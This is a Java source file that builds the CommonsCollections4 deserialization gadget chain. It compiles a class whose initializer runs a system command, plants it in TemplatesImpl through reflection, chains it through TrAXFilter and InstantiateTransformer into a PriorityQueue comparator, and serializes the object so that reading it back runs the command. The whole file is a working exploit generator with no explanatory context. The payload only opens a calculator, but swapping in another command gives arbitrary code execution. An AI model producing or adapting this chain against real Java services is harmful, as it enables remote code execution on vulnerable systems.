import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.*;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;
public class CommonsCollections4 {
    public static void main(String[] args) throws Exception {
        String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
        String TemplatesImpl="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";

        ClassPool classPool=ClassPool.getDefault();
        classPool.appendClassPath(AbstractTranslet);
        CtClass payload=classPool.makeClass("CommonsCollections44444444");
        payload.setSuperclass(classPool.get(AbstractTranslet));
        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");

        byte[] bytes = payload.toBytecode();

        Object templatesImpl = Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();

        Field field=templatesImpl.getClass().getDeclaredField("_bytecodes");
        field.setAccessible(true);
        field.set(templatesImpl,new byte[][]{bytes});

        Field name=templatesImpl.getClass().getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templatesImpl,"test");

        Transformer[] trans = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[]{Templates.class},
                        new Object[]{templatesImpl})
        };
        ChainedTransformer chain = new ChainedTransformer(trans);
        TransformingComparator comparator = new TransformingComparator(chain);

        PriorityQueue queue = new PriorityQueue(2);
        queue.add(1);
        queue.add(1);
        Field com = PriorityQueue.class.getDeclaredField("comparator");
        com.setAccessible(true);
        com.set(queue,comparator);

        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("cc4p.out"));
        outputStream.writeObject(queue);
        outputStream.close();

        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream("cc4p.out"));
        inputStream.readObject();
    }
}
